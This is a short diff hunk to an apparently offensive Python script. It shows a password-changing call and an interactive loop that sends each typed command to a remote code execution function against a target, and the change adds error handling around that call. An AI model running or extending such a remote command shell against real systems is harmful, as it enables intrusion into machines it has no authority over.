@@ -158,5 +158,8 @@ changingpassword(target,token)
 
 while True:
 	cmd = input("CMD:> ")
-	rce(target,cmd)
+	try:
+		rce(target,cmd)
+	except:
+		print("command failed")
 ```
